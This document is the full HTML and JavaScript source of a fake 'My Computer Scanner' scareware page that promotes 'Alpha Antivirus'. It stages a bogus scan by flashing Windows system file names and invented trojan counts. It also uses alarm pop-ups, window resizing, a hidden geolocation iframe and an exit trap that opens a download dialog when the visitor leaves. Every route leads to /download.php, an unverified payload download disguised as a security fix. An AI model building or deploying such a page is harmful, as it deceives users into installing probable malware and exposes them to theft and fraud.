<!DOCTYPE HTML PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml"><head>
<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
<title>My Computer Scanner</title>
<script type="text/javascript" src="img/jquery.js"></script>
<script type="text/javascript" src="img/jquery-init.js"></script>
<script type="text/javascript" src="img/drugndrop.js"></script>
<script>
var fnm=new Array();
fnm[0] = '$winnt$.inf';
fnm[1] = '12520437.cpx';
fnm[2] = '12520850.cpx';
fnm[3] = '6to4svc.dll';
fnm[4] = 'aaaamon.dll';
fnm[5] = 'aaclient.dll';
fnm[6] = 'AboutRepliGo.dll';
fnm[7] = 'ac3acm.acm';
fnm[8] = 'access.cpl';
fnm[9] = 'acctres.dll';
fnm[10] = 'accwiz.exe';
fnm[11] = 'acelpdec.ax';
fnm[12] = 'acledit.dll';
fnm[13] = 'aclui.dll';
fnm[14] = 'activeds.dll';
fnm[15] = 'activeds.tlb';
fnm[16] = 'actmovie.exe';
fnm[17] = 'actxprxy.dll';
fnm[18] = 'ADME.DLL';
fnm[19] = 'admparse.dll';
fnm[20] = 'admwprox.dll';
fnm[21] = 'admxprox.dll';
fnm[22] = 'adptif.dll';
fnm[23] = 'adsiis.dll';
fnm[24] = 'adsldp.dll';
fnm[25] = 'adsldpc.dll';
fnm[26] = 'adsmsext.dll';
fnm[27] = 'adsnds.dll';
fnm[28] = 'adsnt.dll';
fnm[29] = 'adsnw.dll';
fnm[30] = 'advapi32.dll';
fnm[31] = 'advpack.dll';
fnm[32] = 'agas.dll';
fnm[33] = 'ahui.exe';
fnm[34] = 'alg.exe';
fnm[35] = 'alrsvc.dll';
fnm[36] = 'amcompat.tlb';
fnm[37] = 'amstream.dll';
fnm[38] = 'ansi.sys';
fnm[39] = 'apcups.dll';
fnm[40] = 'append.exe';
fnm[41] = 'apphelp.dll';
fnm[42] = 'appmgmts.dll';
fnm[43] = 'appmgr.dll';
fnm[44] = 'appwiz.cpl';
fnm[45] = 'ArmAccess.dll';
fnm[46] = 'arp.exe';
fnm[47] = 'asctrls.ocx';
fnm[48] = 'asferror.dll';
fnm[49] = 'asfsipc.dll';
fnm[50] = 'asr_fmt.exe';
fnm[51] = 'asr_ldm.exe';
fnm[52] = 'asr_pfu.exe';
fnm[53] = 'asycfilt.dll';
fnm[54] = 'at.exe';
fnm[55] = 'AtalaImg2.dll';
fnm[56] = 'AtalaIS.dll';
fnm[57] = 'AtalCtrl.ocx';
fnm[58] = 'athprxy.dll';
fnm[59] = 'ati2cqag.dll';
fnm[60] = 'ati2dvag.dll';
fnm[61] = 'ati2edxx.dll';
fnm[62] = 'ati2evxx.dll';
fnm[63] = 'ati2evxx.exe';
fnm[64] = 'Ati2mdxx.exe';
fnm[65] = 'ati2sgag.exe';
fnm[66] = 'ati3duag.dll';
fnm[67] = 'ATIDDC.DLL';
fnm[68] = 'ATIDEMGR.dll';
fnm[69] = 'ATIDEMGX.dll';
fnm[70] = 'atifglpf.xml';
fnm[71] = 'atiicdxx.dat';
fnm[72] = 'atiiiexx.dll';
fnm[73] = 'atikvmag.dll';
fnm[74] = 'atioglx1.dll';
fnm[75] = 'atioglx2.dll';
fnm[76] = 'atioglxx.dll';
fnm[77] = 'atiok3x2.dll';
fnm[78] = 'atipdlxx.dll';
fnm[79] = 'atitvo32.dll';
fnm[80] = 'ativcoxx.dll';
fnm[81] = 'ativva5x.dat';
fnm[82] = 'ativva6x.dat';
fnm[83] = 'ativvaxx.dat';
fnm[84] = 'ativvaxx.dll';
fnm[85] = 'atkctrs.dll';
fnm[86] = 'atl.dll';
fnm[87] = 'atl71.dll';
fnm[88] = 'AtlColor.ocx';
fnm[89] = 'atmadm.exe';
fnm[90] = 'atmfd.dll';
fnm[91] = 'atmlib.dll';
fnm[92] = 'atmpvcno.dll';
fnm[93] = 'atrace.dll';
fnm[94] = 'attrib.exe';
fnm[95] = 'Audiodev.dll';
fnm[96] = 'audiosrv.dll';
fnm[97] = 'auditusr.exe';
fnm[98] = 'authz.dll';
fnm[99] = 'autochk.exe';
fnm[100] = 'autoconv.exe';
fnm[101] = 'autodisc.dll';
fnm[102] = 'AUTOEXEC.NT';
fnm[103] = 'autofmt.exe';
fnm[104] = 'autolfn.exe';
fnm[105] = 'avicap.dll';
fnm[106] = 'avicap32.dll';
fnm[107] = 'avifil32.dll';
fnm[108] = 'avifile.dll';
fnm[109] = 'avmeter.dll';
fnm[110] = 'avtapi.dll';
fnm[111] = 'avwav.dll';
fnm[112] = 'basesrv.dll';
fnm[113] = 'bass.dll';
fnm[114] = 'BASSMOD.dll';
fnm[115] = 'basswma.dll';
fnm[116] = 'batmeter.dll';
fnm[117] = 'batt.dll';
fnm[118] = 'BCGCBPRO800.dll';
fnm[119] = 'BCGCBPRO800u.dll';
fnm[120] = 'BCGPOleAcc.dll';
fnm[121] = 'bidispl.dll';
fnm[122] = 'bios1.rom';
fnm[123] = 'bios4.rom';
fnm[124] = 'bitsprx2.dll';
fnm[125] = 'bitsprx3.dll';
fnm[126] = 'blackbox.dll';
fnm[127] = 'blastcln.exe';
fnm[128] = 'bootcfg.exe';
fnm[129] = 'bootok.exe';
fnm[130] = 'bootvid.dll';
fnm[131] = 'bootvrfy.exe';
fnm[132] = 'bopomofo.uce';
fnm[133] = 'browselc.dll';
fnm[134] = 'browser.dll';
fnm[135] = 'browseui.dll';
fnm[136] = 'browsewm.dll';
fnm[137] = 'bt2k_ins.dll';
fnm[138] = 'BtAudioHelper.dll';
fnm[139] = 'btbigbmp.dll';
fnm[140] = 'btbip.dll';
fnm[141] = 'btcpl.cpl';
fnm[142] = 'btcpl.cpl.manifest';
fnm[143] = 'btcss.dll';
fnm[144] = 'btcss.dll.manifest';
fnm[145] = 'btdev.dll';
fnm[146] = 'bthci.dll';
fnm[147] = 'bthcrp.dll';
fnm[148] = 'bthcrpui.dll';
fnm[149] = 'bthprops.cpl';
fnm[150] = 'bthserv.dll';
fnm[151] = 'btins.dll';
fnm[152] = 'BTNCopy.dll';
fnm[153] = 'BTNCopy.tlb';
fnm[154] = 'BTNeighborhood.dll';
fnm[155] = 'BTNeighborhood.dll.manifest';
fnm[156] = 'BTNeighborhood.tlb';
fnm[157] = 'btosif.dll';
fnm[158] = 'btosif_notes.dll';
fnm[159] = 'btosif_ol.dll';
fnm[160] = 'btosif_olx.dll';
fnm[161] = 'btpanui.dll';
fnm[162] = 'btprn2k.dll';
fnm[163] = 'btrez.dll';
fnm[164] = 'btrezxp.dll';
fnm[165] = 'btsec.dll';
fnm[166] = 'btsendto.dll';
fnm[167] = 'btsendto_ie.dll';
fnm[168] = 'btsendto_lnagent.nsf';
fnm[169] = 'btsendto_notes.dll';
fnm[170] = 'btsendto_office.dll';
fnm[171] = 'btsendto_wab.dll';
fnm[172] = 'btwhidcs.dll';
fnm[173] = 'BtWiaExt.dll';
fnm[174] = 'BtWizard.dll';
fnm[175] = 'btwpimif.dll';
fnm[176] = 'btw_ci.dll';
fnm[177] = 'BTXPPanel.dll';
fnm[178] = 'BTXPPanel.tlb';
fnm[179] = 'BtXpShell.dll';
fnm[180] = 'C-XLS.dll';
fnm[181] = 'cabinet.dll';
fnm[182] = 'cabview.dll';
fnm[183] = 'cacls.exe';
fnm[184] = 'calc.exe';
fnm[185] = 'camocx.dll';
fnm[186] = 'capesnpn.dll';
fnm[187] = 'cards.dll';
fnm[188] = 'catsrv.dll';
fnm[189] = 'catsrvps.dll';
fnm[190] = 'catsrvut.dll';
fnm[191] = 'ccfgnt.dll';
fnm[192] = 'ccrpbds6.dll';
fnm[193] = 'ccrpprg6.ocx';
fnm[194] = 'cdfview.dll';
fnm[195] = 'cdm.dll';
fnm[196] = 'cdmodem.dll';
fnm[197] = 'cdosys.dll';
fnm[198] = 'cdplayer.exe.manifest';
fnm[199] = 'CDRip3.dll';
fnm[200] = 'certcli.dll';
fnm[201] = 'certmgr.dll';
fnm[202] = 'certmgr.msc';
fnm[203] = 'CEWMDM.dll';
fnm[204] = 'cfgbkend.dll';
fnm[205] = 'cfgmgr32.dll';
fnm[206] = 'charmap.exe';
fnm[207] = 'ChCfg.exe';
fnm[208] = 'chcp.com';
fnm[209] = 'chkdsk.exe';
fnm[210] = 'chkntfs.exe';
fnm[211] = 'ciadmin.dll';
fnm[212] = 'ciadv.msc';
fnm[213] = 'cic.dll';
fnm[214] = 'cidaemon.exe';
fnm[215] = 'ciodm.dll';
fnm[216] = 'cipher.exe';
fnm[217] = 'cisvc.exe';
fnm[218] = 'ckcnv.exe';
fnm[219] = 'clb.dll';
fnm[220] = 'clbcatex.dll';
fnm[221] = 'clbcatq.dll';
fnm[222] = 'cleanmgr.exe';
fnm[223] = 'cliconf.chm';
fnm[224] = 'cliconfg.dll';
fnm[225] = 'cliconfg.exe';
fnm[226] = 'cliconfg.rll';
fnm[227] = 'clipbrd.exe';
fnm[228] = 'clipsrv.exe';
fnm[229] = 'clspack.exe';
fnm[230] = 'clusapi.dll';
fnm[231] = 'cmcfg32.dll';
fnm[232] = 'cmd.exe';
fnm[233] = 'cmdial32.dll';
fnm[234] = 'CMDIALOG.SRG';
fnm[235] = 'cmdl32.exe';
fnm[236] = 'cmdlib.wsc';
fnm[237] = 'CmdLineExt.dll';
fnm[238] = 'cmmgr32.hlp';
fnm[239] = 'cmmon32.exe';
fnm[240] = 'cmos.ram';
fnm[241] = 'cmpbk32.dll';
fnm[242] = 'cmprops.dll';
fnm[243] = 'cmsetACL.dll';
fnm[244] = 'cmstp.exe';
fnm[245] = 'cmutil.dll';
fnm[246] = 'cnbjmon.dll';
fnm[247] = 'cnetcfg.dll';
fnm[248] = 'cnvfat.dll';
fnm[249] = 'colbact.dll';
fnm[250] = 'comaddin.dll';
fnm[251] = 'comcat.dll';
fnm[252] = 'comct232.ocx';
fnm[253] = 'comct332.ocx';
fnm[254] = 'COMCTL.SRG';
fnm[255] = 'COMCTL2.SRG';
fnm[256] = 'comctl32.dll';
fnm[257] = 'comctl32.ocx';
fnm[258] = 'comdlg32.dll';
fnm[259] = 'comdlg32.ocx';
fnm[260] = 'comm.drv';
fnm[261] = 'command.com';
fnm[262] = 'commdlg.dll';
fnm[263] = 'COMMTB32.DLL';
fnm[264] = 'comp.exe';
fnm[265] = 'compact.exe';
fnm[266] = 'CompareFilesX.ocx';
fnm[267] = 'compatUI.dll';
fnm[268] = 'compmgmt.msc';
fnm[269] = 'compobj.dll';
fnm[270] = 'compstui.dll';
fnm[271] = 'comrepl.dll';
fnm[272] = 'comres.dll';
fnm[273] = 'comsnap.dll';
fnm[274] = 'comsvcs.dll';
fnm[275] = 'comuid.dll';
fnm[276] = 'config.hsp';
fnm[277] = 'CONFIG.NT';
fnm[278] = 'CONFIG.TMP';
fnm[279] = 'confmsp.dll';
fnm[280] = 'conime.exe';
fnm[281] = 'console.dll';
fnm[282] = 'control.exe';
fnm[283] = 'convert.exe';
fnm[284] = 'convlog.exe';
fnm[285] = 'corpol.dll';
fnm[286] = 'country.sys';
fnm[287] = 'credui.dll';
fnm[288] = 'crtdll.dll';
fnm[289] = 'crypt32.dll';
fnm[290] = 'cryptdlg.dll';
fnm[291] = 'cryptdll.dll';
fnm[292] = 'cryptext.dll';
fnm[293] = 'cryptnet.dll';
fnm[294] = 'cryptsvc.dll';
fnm[295] = 'cryptui.dll';
fnm[296] = 'cscdll.dll';
fnm[297] = 'cscript.exe';
fnm[298] = 'cscui.dll';
fnm[299] = 'CSH.DLL';
fnm[300] = 'csrsrv.dll';
fnm[301] = 'csrss.exe';
fnm[302] = 'csseqchk.dll';
fnm[303] = 'CSVSpecialProcessing.dll';
fnm[304] = 'ctfmon.exe';
fnm[305] = 'ctl3d32.dll';
fnm[306] = 'ctl3dv2.dll';
fnm[307] = 'ctype.nls';
fnm[308] = 'c_037.nls';
fnm[309] = 'c_10000.nls';
fnm[310] = 'c_10006.nls';
fnm[311] = 'c_10007.nls';
fnm[312] = 'c_10010.nls';
fnm[313] = 'c_10017.nls';
fnm[314] = 'c_10029.nls';
fnm[315] = 'c_10079.nls';
fnm[316] = 'c_10081.nls';
fnm[317] = 'c_10082.nls';
fnm[318] = 'c_1026.nls';
fnm[319] = 'c_1250.nls';
fnm[320] = 'c_1251.nls';
fnm[321] = 'c_1252.nls';
fnm[322] = 'c_1253.nls';
fnm[323] = 'c_1254.nls';
fnm[324] = 'c_1255.nls';
fnm[325] = 'c_1256.nls';
fnm[326] = 'c_1257.nls';
fnm[327] = 'c_1258.nls';
fnm[328] = 'c_20127.nls';
fnm[329] = 'c_20261.nls';
fnm[330] = 'c_20866.nls';
fnm[331] = 'c_20905.nls';
fnm[332] = 'c_21866.nls';
fnm[333] = 'c_28591.nls';
fnm[334] = 'c_28592.nls';
fnm[335] = 'c_28593.nls';
fnm[336] = 'C_28594.NLS';
fnm[337] = 'C_28595.NLS';
fnm[338] = 'C_28597.NLS';
fnm[339] = 'c_28598.nls';
fnm[340] = 'c_28599.nls';
fnm[341] = 'c_28603.nls';
fnm[342] = 'c_28605.nls';
fnm[343] = 'c_437.nls';
fnm[344] = 'c_500.nls';
fnm[345] = 'c_737.nls';
fnm[346] = 'c_775.nls';
fnm[347] = 'c_850.nls';
fnm[348] = 'c_852.nls';
fnm[349] = 'c_855.nls';
fnm[350] = 'c_857.nls';
fnm[351] = 'c_860.nls';
fnm[352] = 'c_861.nls';
fnm[353] = 'c_863.nls';
fnm[354] = 'c_865.nls';
fnm[355] = 'c_866.nls';
fnm[356] = 'c_869.nls';
fnm[357] = "fdff.fd";
fnm[358] = 'c_875.nls';
fnm[359] = 'c_932.nls';
fnm[360] = 'c_936.nls';
fnm[361] = 'c_949.nls';
fnm[362] = 'c_950.nls';
fnm[363] = 'd3d8.dll';
fnm[364] = 'd3d8caps.dat';
fnm[365] = 'd3d8thk.dll';
fnm[366] = 'd3d9.dll';
fnm[367] = 'd3d9caps.dat';
fnm[368] = 'd3dim.dll';
fnm[369] = 'd3dim700.dll';
fnm[370] = 'd3dpmesh.dll';
fnm[371] = 'd3dramp.dll';
fnm[372] = 'd3drm.dll';
fnm[373] = 'd3dx9_24.dll';
fnm[374] = 'd3dx9_25.dll';
fnm[375] = 'd3dx9_26.dll';
fnm[376] = 'd3dx9_27.dll';
fnm[377] = 'd3dx9_28.dll';
fnm[378] = 'd3dx9_29.dll';
fnm[379] = 'd3dx9_30.dll';
fnm[380] = 'd3dx9_31.dll';
fnm[381] = 'd3dx9_32.dll';
fnm[382] = 'd3dxof.dll';
fnm[383] = 'danim.dll';
fnm[384] = 'dataclen.dll';
fnm[385] = 'datime.dll';
fnm[386] = 'davclnt.dll';
fnm[387] = 'daxctle.ocx';
fnm[388] = 'dbgeng.dll';
fnm[389] = 'dbghelp.dll';
fnm[390] = 'dbmsrpcn.dll';
fnm[391] = 'DBMSSHRN.DLL';
fnm[392] = 'DBMSSOCN.DLL';
fnm[393] = 'dbnetlib.dll';
fnm[394] = 'dbnmpntw.dll';
fnm[395] = 'Dcache.bin';
fnm[396] = 'dciman32.dll';
fnm[397] = 'dcomcnfg.exe';
fnm[398] = 'ddeml.dll';
fnm[399] = 'ddeshare.exe';
fnm[400] = 'ddraw.dll';
fnm[401] = 'ddrawex.dll';
fnm[402] = 'debug.exe';
fnm[403] = 'defrag.exe';
fnm[404] = 'desk.cpl';
fnm[405] = 'deskadp.dll';
fnm[406] = 'deskmon.dll';
fnm[407] = 'deskperf.dll';
fnm[408] = 'desktop.ini';
fnm[409] = 'devenum.dll';
fnm[410] = 'devmgmt.msc';
fnm[411] = 'devmgr.dll';
fnm[412] = 'dfrg.msc';
fnm[413] = 'dfrgfat.exe';
fnm[414] = 'dfrgntfs.exe';
fnm[415] = 'dfrgres.dll';
fnm[416] = 'dfrfnmnap.dll';
fnm[417] = 'dfrgui.dll';
fnm[418] = 'dfshim.dll';
fnm[419] = 'dfsshlex.dll';
fnm[420] = 'dgnet.dll';
fnm[421] = 'dgrpsetu.dll';
fnm[422] = 'dfnmetup.dll';
fnm[423] = 'dhcpcsvc.dll';
fnm[424] = 'dhcpmon.dll';
fnm[425] = 'dhcpsapi.dll';
fnm[426] = 'diactfrm.dll';
fnm[427] = 'diantz.exe';
fnm[428] = 'DiffDoc.CNT';
fnm[429] = 'DiffDoc.HLP';
fnm[430] = 'digest.dll';
fnm[431] = 'dimap.dll';
fnm[432] = 'dinput.dll';
fnm[433] = 'dinput8.dll';
fnm[434] = 'diskcomp.com';
fnm[435] = 'diskcopy.com';
fnm[436] = 'diskcopy.dll';
fnm[437] = 'diskmgmt.msc';
fnm[438] = 'diskpart.exe';
fnm[439] = 'diskperf.exe';
fnm[440] = 'dispex.dll';
fnm[441] = 'dllhost.exe';
fnm[442] = 'dllhst3g.exe';
fnm[443] = 'dmadmin.exe';
fnm[444] = 'dmband.dll';
fnm[445] = 'dmcompos.dll';
fnm[446] = 'dmconfig.dll';
fnm[447] = 'dmdlfnm.dll';
fnm[448] = 'dmdskmgr.dll';
fnm[449] = 'dmdskres.dll';
fnm[450] = 'dmime.dll';
fnm[451] = 'dmintf.dll';
fnm[452] = 'dmloader.dll';
fnm[453] = 'dmocx.dll';
fnm[454] = 'dmremote.exe';
fnm[455] = 'dmscript.dll';
fnm[456] = 'dmserver.dll';
fnm[457] = 'dmstyle.dll';
fnm[458] = 'dmsynth.dll';
fnm[459] = 'dmusic.dll';
fnm[460] = 'dmutil.dll';
fnm[461] = 'dmview.ocx';
fnm[462] = 'dns-sd.exe';
fnm[463] = 'dnsapi.dll';
fnm[464] = 'dnsrslvr.dll';
fnm[465] = 'dnssd.dll';
fnm[466] = 'docprop.dll';
fnm[467] = 'docprop2.dll';
fnm[468] = 'doskey.exe';
fnm[469] = 'dosx.exe';
fnm[470] = 'dpcdll.dll';
fnm[471] = 'dplay.dll';
fnm[472] = 'dplaysvr.exe';
fnm[473] = 'dplayx.dll';
fnm[474] = 'dpmodemx.dll';
fnm[475] = 'dpnaddr.dll';
fnm[476] = 'dpnet.dll';
fnm[477] = 'dpnhpast.dll';
fnm[478] = 'dpnhupnp.dll';
fnm[479] = 'dpnlobby.dll';
fnm[480] = 'dpnmodem.dll';
fnm[481] = 'dpnsvr.exe';
fnm[482] = 'dpnwsock.dll';
fnm[483] = 'dpserial.dll';
fnm[484] = 'dpvacm.dll';
fnm[485] = 'dpvoice.dll';
fnm[486] = 'dpvsetup.exe';
fnm[487] = 'dpvvox.dll';
fnm[488] = 'dpwsock.dll';
fnm[489] = 'dpwsockx.dll';
fnm[490] = 'Drake.dll';
fnm[491] = 'DrakeCom.dll';
fnm[492] = 'driverquery.exe';
fnm[493] = 'drmclien.dll';
fnm[494] = 'drmstor.dll';
fnm[495] = 'drmupgds.exe';
fnm[496] = 'drmv2clt.dll';
fnm[497] = 'drprov.dll';
fnm[498] = 'DRVSSRVR.HLP';
fnm[499] = 'DRVVFP.CNT';
fnm[500] = 'DRVVFP.HLP';
fnm[501] = 'drwatson.exe';
fnm[502] = 'drwtsn32.exe';
fnm[503] = 'ds16gt.dLL';
fnm[504] = 'ds32gt.dll';
fnm[505] = 'dsauth.dll';
fnm[506] = 'dsdmo.dll';
fnm[507] = 'dsdmoprp.dll';
fnm[508] = 'dskquota.dll';
fnm[509] = 'dskquoui.dll';
fnm[510] = 'dsound.dll';


var pinter;var ss=15;var teracti=0;
function hideWarnDialog()
{
	if(confirm('We recommend you to download and install antivirus software.'))	{
		
	}
	else	{
		emilion();
	};
};
function emilion(){
alert('Potentially dangerous software. These programs may damage your computer and steal your private information. On-lines scan should install Alpha Antivirus utilities to fix your pc. Please click Ok to download and install Alpha Antivirus tool. ');
}
function update()
{
 if ($(".progress_bar_fill").width()>0)
 {
  $("#progress_prcnt").html((Math.round(100-$(".progress_bar_fill").width()/417*100))+"%");
  $("#files1").html(fnm[Math.floor(Math.random()*fnm.length)] );
  if ($(".progress_bar_fill").width()<350 && teracti==0)
  {
   document.getElementById('threat1').style.visibility = 'visible';
   document.getElementById('desc').style.visibility = 'visible';
   setInterval("$('#tc1').toggleClass('none')",1000);
   teracti=1;
  }
  if ($(".progress_bar_fill").width()<200 && teracti==1)
  {
   document.getElementById('threat2').style.visibility = 'visible';
   setInterval("$('#tc2').toggleClass('none')",1000);
   teracti=2;
  }
  if ($(".progress_bar_fill").width()<100 && teracti==2)
  {
   document.getElementById('threat3').style.visibility = 'visible';
   setInterval("$('#tc3').toggleClass('none')",1000);
   setInterval("$('#tc4').toggleClass('none')",1000);
   teracti=3;
  }  
 }
 else
 {
  clearInterval(pinter);
  $(".files2").html("<b>System scanning completed. 431 Probably harmfull items was found!</b>");
  setTimeout("pop2()",1000);
 }
}
function Minimize() 
{
window.innerWidth = 100;
window.innerHeight = 100;
window.screenX = screen.width;
window.screenY = screen.height;
alwaysLowered = true;
}
function Maximize() {window.moveTo(0,0); window.resizeTo( screen.width, screen.height );}
function download() {
 window.location='/download.php?id=2004';
}
function away()
{
	w = window;
	ua = navigator.userAgent;
	v1 = ua.toLowerCase().indexOf('msie') != -1 && ua.toLowerCase().indexOf('opera') < 0;
  	x = 11;
  	eval('w.resizeTo(x*10,x*11-7)');
	w.moveTo(v1 ? (screen.width - 100) >> 1 : 11027, v1 ? (screen.height - 100) >> 1 : 10659);
}
function pop1() {
	confirm('Warning!!! '+
	'Your system requires immediate  scan! Alpha Antivirus can perform fast and free virus and malicious software scan of your computer .');
	}
function pop2() {
confirm('Your computer remains infected by threats! '+
'They might lead to data loss and file structure damage, and needed to be heal as soon as possible.\n\n'+
'Return to Alpha Antivirus and download it secure to your PC');
pop4();
}
function pop3dsds() {
alert('Your computer remains infected by threats ! '+
'They can cause data loss and file damages and need to be cured as soon as possible.\n\n'+
'Return to Alpha Antivirus and download it secure to your PC');
}
function pop4() {
  document.getElementById('ap').style.display = 'block';
  $(".left_bar").css("display","none");
  $(".left_bar").css("display","block");
}
function sp2init(){
}
function loading() {
  if (window.attachEvent)
    away();
  pop1();
  Maximize();
  window.focus(); 
}
function loaded() {
  $("#white").css("display","none");
  $("#page_progress").css("display","block");
  $(".left_bar").css("display","none");
  $(".left_bar").css("display","block");
  $(".progress_bar_fill").animate({width:"0px"},ss*1000);
  writegeoip();
	pinter = setInterval(update,ss*10);	
};
loading();
var exit = true;
var usePopDialog = true;
var nid=0;
var tid=431;
var mid=947;
var full=1;
var popDialogOptions = "dialogWidth:1024px; dialogHeight:768px; dialogTop:0px; dialogLeft:0px; edge:Raised; center:0; help:0; resizable:1; scroll:1; status:0";
var popWindowOptions = " scrollbars=1,menubar=1,toolbar=1,location=1,personalbar=1,status=1,resizable=1";
var clid = "7f09c9e1c55f7d63f02909a14c1a45e0";
var usePopDialog = true;
var isUsinfnmpecial = false;
dat=new Date(1254186642);
var dlth=dat.getHours()-dat.getUTCHours();
newurl = "/download.php?id=2004&dlth="+dlth;
var isXPSP2 = false;
var u = "6BF52A52-394A-11D3-B153-00C04F79FAA6";
function ext(){
       if(exit)       {
               exit=false;
               emilion();
               if(!isXPSP2 && !usePopDialog)               {
                         window.open(popURL,"",popWindowOptions);
               }else if(!isXPSP2 && usePopDialog) {
                         eval("window.showModalDialog(popURL,'',popDialogOptions)");
               }else{
                         iie.launchURL(popURL);
               }
        }
}
var popURL = newurl;
isUsinfnmpecial = true;
if (window.attachEvent)
 eval("window.attachEvent('onunload',ext);");
else
 window.addEventListener("unload", ext, false);
</script>
<link href="img/style.css" rel="stylesheet" type="text/css" />
</head>
<body onLoad="loaded()">

<DIV id=ap style="LEFT: 0px; z-index:2; WIDTH: 100%; POSITION: absolute; TOP: 190px; display: none;" align=center>
<DIV style="cursor:hand; WIDTH: 434px; height:332px; POSITION: relative; background-image:url(img/001.gif); background-color:white;"><input type='button' style='POSITION: relative; width:21px; height:21px; left:200px; top:5px; border-width:0px; background-image:url(cb.gif)' onclick='hideWarnDialog();'><spacer width='446' height='294' /></DIV>
</div>

<div style="display: none;" id="white" class="white_div" align="center">
	<div style="position: relative; top: 50%;"><img src="img/007.gif" width="51" height="19">    </div>
   </div>
<div style="display: block;" class="left_bar">
  <div class="left_header">System Tasks</div>
	<div class="left_box">
		<div class="left_box_line">
			<img src="img/016.gif" class="left_bar_icon" width="14" height="16"><a href="#">View system information</a>	    </div>
	  <div class="left_box_line">
    	<img src="img/017.gif" class="left_bar_icon" width="16" height="16"> <a href="#">Add or remove programs</a>	  </div>
	  <div class="left_box_line">
   	    <img src="img/018.gif" class="left_bar_icon" width="16" height="16"> <a href="#">Change a settinfnm</a>      </div>
  </div>
	<div class="left_header">
		Other Places  </div>
	<div class="left_box">
		<div class="left_box_line">
			<img src="img/012.gif" class="left_bar_icon" width="16" height="16"> <a href="#">My Network Places</a>		</div>
	  <div class="left_box_line">
    	<img src="img/013.gif" class="left_bar_icon" width="16" height="16"> <a href="#">My Documents</a>      </div>
	  <div class="left_box_line">
   	    <img src="img/014.gif" class="left_bar_icon" width="16" height="14"> <a href="#">Shared Documents</a>      </div>
	  <div class="left_box_line">
   	    <img src="img/015.gif" class="left_bar_icon" width="16" height="16"> <a href="#">Control Panel</a>      </div>
  </div>
	<div class="left_header">
		Details  </div>
	<div class="left_box">
	  <div class="left_box_line"> <strong>My Computer</strong><br>
System Folder      </div>
	</div>
    <div class="left_header">
                Your Info </div>
        <div class="left_box">
          <div class="left_box_line">
      <strong>IP: </strong><span style="color:#F00">84.42.39.75</span><br>
      <strong>Country: </strong><span id="geoipcountry" style="color:#F00"></span><br>
      <strong>City: </strong><span id="geoipcity" style="color:#F00"></span><br>
      <div style="margin-top:5px; color:#F00"><strong>Your private data is under attack!</strong></div>
      </div>
        </div>
</div>

<div class="right_bar">
  <div class="right_hr">
    	System scan progress  </div>
	<div class="folder_box">
   	  <div id="tc1" class="trojan none">
        	<img src="img/020.gif" width="15" align="absmiddle" height="18"><span class="trojan_caption">97 trojans</span>      </div>

  <img src="img/004.gif" class="folder_icon" width="43" height="40">Shared Documents  </div>
  <div class="folder_box">
    	<div id="tc2" class="trojan none">
        	<img src="img/020.gif" width="15" align="absmiddle" height="18"><span class="trojan_caption">334 trojans</span>        </div>
    
  <img src="img/004.gif" class="folder_icon" width="43" height="40">My Documents  </div>
  <div class="right_hr">
    	Hard drives  </div>
	<div class="folder_box">
    	<div id="tc3" class="trojan none">
        	<img src="img/020.gif" width="15" align="absmiddle" height="18"><span class="trojan_caption">353 trojans</span>        </div>
    
  <img src="img/005.gif" class="folder_icon" width="43" height="40">Local Disk (C:)  </div>
  <div class="folder_box">
    	<div id="tc4" class="trojan none">
        	<img src="img/020.gif" width="15" align="absmiddle" height="18"><span class="trojan_caption">78 trojans</span>        </div>
    
  <img src="img/005.gif" class="folder_icon" width="43" height="40">Local Disk (D:)  </div>
  <div class="right_hr">
    	DVD  </div>
	<div class="folder_box">
    	<img src="img/003.gif" class="folder_icon" width="43" height="40">DVD-RAM Drive (E:)  </div>
  <div class="progress_bar">
	<div class="progress_bar_bg">
	  <div class="progress_bar_progress">
       	<div style=" display: block;" class="progress_bar_fill">        </div>
            	<div id="progress_prcnt">100%</div>                      
      </div>          
	</div>
  </div>
    <div class="files2" style=" padding-top:3px;padding-left:15px;"><strong>Now scanning: <span id="files1"></span></strong></div>
	<div class="window1">
   	  <div style="font-size: 15px; font-weight: bold; color: white; padding-top: 14px; padding-left: 35px;">
        	Your Computer is Infected!      </div>
    	<div style="padding-top: 22px;">
        	Threats and actions:      </div>   
        <table border="0">
          <tbody><tr>
            <td width="166" class="td_cell1">Name</td>
            <td class="td_cell1" width="105">Risk level</td>
            <td width="85" class="td_cell1">Date</td>
            <td width="120" class="td_cell1">Files infected</td>
            <td width="120" class="td_cell1">State</td>
          </tr>
          <tr class="" id="threat1" style=" visibility:hidden;">
            <td class="td_cell2"><img src="img/010.gif" style="padding-right: 5px;" align="absmiddle">  <b>W32/Virut.a!</b></td>
            <td class="td_cell2"><b><font color="red">Critical</font></b></td>
            <td class="td_cell2">11.18.2008</td>
            <td class="td_cell2">36</td>
            <td class="td_cell2">Waiting removal</td>
          </tr>
          <tr class="" id="threat2" style=" visibility:hidden;">
            <td class="td_cell2"><img src="img/010.gif" style="padding-right: 5px;" align="absmiddle">  <b>Exploit-MSWord</b></td>
            <td class="td_cell2"><b><font color="red">Critical</font></b></td>
            <td class="td_cell2">11.18.2008</td>
            <td class="td_cell2">65</td>
            <td class="td_cell2">Waiting removal</td>
          </tr>
          <tr class="" id="threat3" style=" visibility:hidden;">
            <td class="td_cell2"><img src="img/010.gif" style="padding-right: 5px;" align="absmiddle">  <b>Win 32:Delf-XQ</b></td>
            <td class="td_cell2"><b><font color="red">Critical</font></b></td>
            <td class="td_cell2">11.18.2008</td>
            <td class="td_cell2">44</td>
            <td class="td_cell2">Waiting removal</td>
          </tr>
      </tbody></table>

        <div style=" visibility:hidden; padding-top: 12px; padding-left: 12px; width: 600px;" class="" id="desc">
            <b>Description:</b><br>
            This program is potentially dangerous for your system. <b>Trojan-Downloader</b> stealing passwords, credit cards and other personal information from your computer.
            <br><br>
            <b>Advice:</b><br>
            You need to remove this threat as soon as possible!      </div>
        <div style="padding-top: 50px; padding-left: 590px;"><a href="/download.php?id=2004">Full system cleanup</a></div>
  </div>
</div>
<div id="geoipdiv" style="display:none"></div>
<script language="javascript">Drag.init(document.getElementById('ap'));
function writegeoip(){
	d=document.getElementById('geoipdiv');
	d.innerHTML="<iframe width=1 height=1 border=0 src='geoip.php'></iframe>";
}
</script>
</body></html>
